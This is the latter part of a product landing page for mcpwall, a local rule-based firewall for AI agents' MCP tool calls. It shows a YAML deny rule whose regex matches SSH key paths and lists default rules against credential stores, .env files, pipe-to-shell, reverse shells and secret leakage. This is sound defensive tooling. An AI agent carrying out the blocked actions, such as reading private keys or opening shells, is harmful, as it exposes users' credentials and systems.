                  <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="text-zinc-500">method:</span> <span class="text-zinc-300">tools/call</span></div>
                  <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="text-zinc-500">tool:</span> <span class="text-amber-300">"*"</span></div>
                  <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="text-zinc-500">arguments:</span></div>
                  <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="text-zinc-500">_any_value:</span></div>
                  <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="text-zinc-500">regex:</span> <span class="text-amber-300">"(\.ssh/|id_rsa|id_ed25519)"</span></div>
                  <div>&nbsp;&nbsp;<span class="text-zinc-500">action:</span> <span class="text-danger-400">deny</span></div>
                  <div>&nbsp;&nbsp;<span class="text-zinc-500">message:</span> <span class="text-zinc-400">"Blocked: access to SSH keys"</span></div>
                </div>
              </div>
            </div>

            <p class="font-body text-lg text-zinc-300 leading-relaxed max-w-2xl mt-10 fade-up">
              <span class="text-brand-400 font-500">Eight default rules</span> cover the most common attack vectors out of the box: SSH keys, <code class="font-mono text-sm text-zinc-300 bg-zinc-800 px-1 py-0.5 rounded">.env</code> files, credential stores, browser data, destructive commands, pipe-to-shell, reverse shells, and secret leakage.
            </p>
            <p class="font-body text-lg text-zinc-400 leading-relaxed max-w-2xl mt-4 fade-up">
              No config needed. The defaults apply automatically.
            </p>
          </div>
          <aside class="marginalia mt-8 xl:mt-24 hide-mobile">
            The secret scanner uses both regex patterns and Shannon entropy analysis to catch high-entropy strings that static patterns miss.<br><br>
            <code class="text-zinc-500">_any_value</code> applies the matcher to ALL argument values in the tool call.
          </aside>
        </div>
      </div>
    </section>

    <div class="section-line-safe"></div>

    <!-- ========== SECTION 6: INSTALL ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-4xl mx-auto">
        <div class="font-mono text-[11px] text-brand-500/60 tracking-widest uppercase mb-6 fade-up">06 / Install in 60 Seconds</div>

        <div class="fade-up">
          <div class="install-box mb-8" onclick="copyCmd(this, 'npm install -g mcpwall')">
            <span><span class="text-zinc-500">$</span> npm install -g mcpwall</span>
            <span class="text-zinc-500 text-xs copy-hint">click to copy</span>
          </div>
        </div>

        <p class="font-body text-zinc-400 mb-8 fade-up">Then change your MCP config:</p>

        <!-- Before / After split -->
        <div class="grid md:grid-cols-2 gap-5 fade-up">
          <div>
            <div class="text-xs font-mono text-zinc-600 mb-3 tracking-wider uppercase">Before</div>
            <div class="code-block">
              <div class="text-zinc-500">// .mcp.json</div>
              <div>{</div>
              <div class="ml-4"><span class="text-zinc-400">"command"</span>: <span class="text-amber-300">"npx"</span>,</div>
              <div class="ml-4"><span class="text-zinc-400">"args"</span>: [<span class="text-amber-300">"-y"</span>,</div>
              <div class="ml-8"><span class="text-amber-300">"@mcp/server-filesystem"</span>,</div>
              <div class="ml-8"><span class="text-amber-300">"/path/to/dir"</span>]</div>
              <div>}</div>
            </div>
          </div>
          <div>
            <div class="text-xs font-mono text-brand-400 mb-3 tracking-wider uppercase flex items-center gap-2">
              After <span class="text-[10px] text-brand-500/60 font-normal normal-case">&mdash; one line</span>
            </div>
            <div class="code-block" style="border-color: rgba(6, 182, 212, 0.12);">
              <div class="text-zinc-500">// .mcp.json</div>
              <div>{</div>
              <div class="ml-4"><span class="text-zinc-400">"command"</span>: <span class="text-amber-300">"npx"</span>,</div>
              <div class="ml-4"><span class="text-zinc-400">"args"</span>: [<span class="text-amber-300">"-y"</span>, <span class="text-brand-300">"mcpwall"</span>, <span class="text-brand-300">"--"</span>,</div>
              <div class="ml-8"><span class="text-amber-300">"npx"</span>, <span class="text-amber-300">"-y"</span>,</div>
              <div class="ml-8"><span class="text-amber-300">"@mcp/server-filesystem"</span>,</div>
              <div class="ml-8"><span class="text-amber-300">"/path/to/dir"</span>]</div>
              <div>}</div>
            </div>
          </div>
        </div>

        <p class="font-body text-zinc-400 mt-8 fade-up">Or let mcpwall find and wrap your servers automatically:</p>

        <div class="fade-up mt-4">
          <div class="install-box" onclick="copyCmd(this, 'mcpwall init')">
            <span><span class="text-zinc-500">$</span> mcpwall init</span>
            <span class="text-zinc-500 text-xs copy-hint">click to copy</span>
          </div>
        </div>
      </div>
    </section>

    <div class="section-line-safe"></div>

    <!-- ========== SECTION 7: WHAT THIS IS AND ISN'T ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-4xl mx-auto">
        <div class="font-mono text-[11px] text-brand-500/60 tracking-widest uppercase mb-6 fade-up">07 / What This Is and Isn&rsquo;t</div>

        <div class="not-grid fade-up">
          <div class="grid sm:grid-cols-2 gap-4">
            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(239,68,68,0.04); border: 1px solid rgba(239,68,68,0.08);">
              <span class="not-label text-danger-500 shrink-0 mt-0.5">&cross;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Not a scanner</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Doesn&rsquo;t check tool descriptions.</div>
              </div>
            </div>
            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.08);">
              <span class="not-label text-brand-400 shrink-0 mt-0.5">&check;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Runtime firewall</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Enforces policy on every tool call as it happens.</div>
              </div>
            </div>

            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(239,68,68,0.04); border: 1px solid rgba(239,68,68,0.08);">
              <span class="not-label text-danger-500 shrink-0 mt-0.5">&cross;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Not AI-powered</div>
                <div class="font-body text-zinc-500 text-sm mt-1">No hallucinations. No latency.</div>
              </div>
            </div>
            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.08);">
              <span class="not-label text-brand-400 shrink-0 mt-0.5">&check;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Deterministic YAML rules</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Same input + same rules = same output.</div>
              </div>
            </div>

            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(239,68,68,0.04); border: 1px solid rgba(239,68,68,0.08);">
              <span class="not-label text-danger-500 shrink-0 mt-0.5">&cross;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Not a replacement</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Complements scanners and sandboxing.</div>
              </div>
            </div>
            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.08);">
              <span class="not-label text-brand-400 shrink-0 mt-0.5">&check;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Defense in depth</div>
                <div class="font-body text-zinc-500 text-sm mt-1">A layer that didn&rsquo;t exist before.</div>
              </div>
            </div>

            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(239,68,68,0.04); border: 1px solid rgba(239,68,68,0.08);">
              <span class="not-label text-danger-500 shrink-0 mt-0.5">&cross;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">No cloud dependency</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Zero network calls. Zero telemetry.</div>
              </div>
            </div>
            <div class="flex gap-4 p-5 rounded-xl" style="background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.08);">
              <span class="not-label text-brand-400 shrink-0 mt-0.5">&check;</span>
              <div>
                <div class="font-body text-zinc-200 font-500 text-[15px]">Entirely local</div>
                <div class="font-body text-zinc-500 text-sm mt-1">Your secrets never leave your machine.</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <div class="section-line-safe"></div>

    <!-- ========== SECTION 8: WHY NOW ========== -->
    <section class="px-6 py-24 md:py-32">
      <div class="max-w-4xl mx-auto">
        <div class="font-mono text-[11px] text-brand-500/60 tracking-widest uppercase mb-6 fade-up">08 / Why This Matters Now</div>

        <div class="grid sm:grid-cols-2 gap-5 stagger" id="urgency-cards">
          <div class="p-6 rounded-xl" style="background: rgba(239,68,68,0.04); border: 1px solid rgba(239,68,68,0.1);">
            <div class="font-mono text-[11px] text-danger-400/60 tracking-wider mb-2">CVE-2025-6514</div>
            <div class="font-display font-700 text-2xl text-zinc-100 tracking-tight">CVSS 9.6</div>
            <p class="font-body text-zinc-500 text-sm mt-2">Critical RCE in mcp-remote. 437K+ installs affected.</p>
          </div>

          <div class="p-6 rounded-xl" style="background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.1);">
            <div class="font-mono text-[11px] text-brand-500/60 tracking-wider mb-2">EU AI ACT</div>
            <div class="font-display font-700 text-2xl text-zinc-100 tracking-tight">Aug 2, 2026</div>
            <p class="font-body text-zinc-500 text-sm mt-2">Major enforcement provisions take effect.</p>
          </div>

          <div class="sm:col-span-2 p-6 rounded-xl" style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05);">
            <p class="font-body text-zinc-300 leading-relaxed text-[15px]">
              MCP adoption is accelerating&thinsp;&mdash;&thinsp;it&rsquo;s been donated to the Linux Foundation, every major AI coding tool supports it, and the server ecosystem is growing by hundreds per week. The attack surface is growing faster than the security tooling. If you use MCP servers, a programmable policy layer between your AI agent and those servers is defense in depth.
            </p>
          </div>
        </div>
      </div>
    </section>

  </article>

  <!-- ========== FOOTER ========== -->
  <footer class="px-6 py-16 border-t border-white/5">
    <div class="max-w-5xl mx-auto">
      <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-8">
        <div>
          <div class="font-body text-zinc-500 text-sm">
            <span class="text-zinc-400 font-500">Dom Behrens</span> builds security tools for AI development workflows.
          </div>
          <div class="flex items-center gap-6 mt-4">
            <a href="https://github.com/behrensd/mcp-firewall" target="_blank" class="text-xs text-zinc-600 hover:text-zinc-400 transition-colors font-mono">GitHub</a>
            <a href="https://www.npmjs.com/package/mcpwall" target="_blank" class="text-xs text-zinc-600 hover:text-zinc-400 transition-colors font-mono">npm</a>
            <a href="https://mcpwall.dev" class="text-xs text-zinc-600 hover:text-zinc-400 transition-colors font-mono">mcpwall.dev</a>
          </div>
        </div>
        <div class="text-xs text-zinc-700 font-body leading-relaxed text-right">
          FSL-1.1-Apache-2.0<br>
          Converts to Apache 2.0 after 2 years.
        </div>
      </div>
    </div>
  </footer>

  <!-- ========== SCRIPTS ========== -->
  <script>
    // --- Progress bar ---
    const progressBar = document.getElementById('progress-bar');
    function updateProgress() {
      const scrollTop = window.scrollY;
      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
      const progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
      progressBar.style.width = progress + '%';
      // Shift gradient based on progress
      progressBar.style.backgroundPosition = (100 - progress) + '% 0';
    }
    window.addEventListener('scroll', updateProgress, { passive: true });

    // --- Phase shift (red → cyan atmosphere) ---
    const phaseShift = document.getElementById('phase-shift');
    const phaseTransition = document.getElementById('phase-transition');
    let hasShifted = false;

    function checkPhaseShift() {
      if (hasShifted) return;
      const rect = phaseShift.getBoundingClientRect();
      if (rect.top < window.innerHeight * 0.6) {
        hasShifted = true;
        document.body.classList.add('phase-safe');
        phaseTransition.classList.add('flash');
        setTimeout(() => phaseTransition.classList.remove('flash'), 1000);
      }
    }
    window.addEventListener('scroll', checkPhaseShift, { passive: true });

    // --- Scroll-triggered fade-up ---
    const fadeObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
        }
      });
    }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });

    document.querySelectorAll('.fade-up, .stagger').forEach(el => fadeObserver.observe(el));

    // --- Terminal line-by-line reveal ---
    function revealTerminal(terminalId) {
      const body = document.getElementById(terminalId);
      if (!body || body.dataset.revealed) return;
      body.dataset.revealed = 'true';
      const lines = body.querySelectorAll('.terminal-line');
      lines.forEach((line, i) => {
        const delay = parseInt(line.dataset.delay) || (i * 200);
        setTimeout(() => {
          line.classList.add('revealed');
          // Breach flash
          if (line.classList.contains('breach-line') && line.id === 'breach-line') {
            setTimeout(() => {
              body.querySelectorAll('.breach-line').forEach(bl => bl.classList.add('flash'));
            }, 600);
          }
        }, delay);
      });
      return lines.length > 0 ? parseInt(lines[lines.length - 1].dataset.delay) + 500 : 1000;
    }

    // Attack terminal observer
    const attackTerminal = document.getElementById('attack-terminal');
    const attackObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const totalDelay = revealTerminal('attack-terminal-body');
          // Show breach callout after terminal finishes
          const callout = document.getElementById('breach-callout');
          setTimeout(() => {
            callout.style.opacity = '1';
            callout.style.transform = 'translateY(0)';
            callout.style.transition = 'opacity 0.7s ease, transform 0.7s ease';
          }, totalDelay + 800);
          attackObserver.unobserve(entry.target);
        }
      });
    }, { threshold: 0.3 });
    attackTerminal && attackObserver.observe(attackTerminal);

    // Escalation terminal observer
    const escalationTerminal = document.getElementById('escalation-terminal');
    const escalationObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          revealTerminal('escalation-terminal-body');
          escalationObserver.unobserve(entry.target);
        }
      });
    }, { threshold: 0.3 });
    escalationTerminal && escalationObserver.observe(escalationTerminal);

    // Fix terminal observer
    const fixTerminal = document.getElementById('fix-terminal');
    const fixObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          revealTerminal('fix-terminal-body');
          fixObserver.unobserve(entry.target);
        }
      });
    }, { threshold: 0.3 });
    fixTerminal && fixObserver.observe(fixTerminal);

    // --- Glitch title on load ---
    window.addEventListener('load', () => {
      const title = document.querySelector('.glitch-title');
      // Trigger hero fade-ups
      document.querySelectorAll('header .fade-up').forEach((el, i) => {
        setTimeout(() => el.classList.add('visible'), i * 150);
      });
      // Glitch effect
      setTimeout(() => {
        title.classList.add('glitching');
        setTimeout(() => title.classList.remove('glitching'), 300);
      }, 800);
      setTimeout(() => {
        title.classList.add('glitching');
        setTimeout(() => title.classList.remove('glitching'), 200);
      }, 1500);
    });

    // --- Copy command ---
    function copyCmd(el, text) {
      navigator.clipboard.writeText(text);
      const hint = el.querySelector('.copy-hint');
      hint.textContent = 'copied!';
      hint.style.color = '#22c55e';
      el.style.borderColor = 'rgba(34, 197, 94, 0.3)';
      el.style.background = 'rgba(34, 197, 94, 0.06)';
      setTimeout(() => {
        hint.textContent = 'click to copy';
        hint.style.color = '';
        el.style.borderColor = '';
        el.style.background = '';
      }, 2000);
    }
  </script>
</body>
</html>
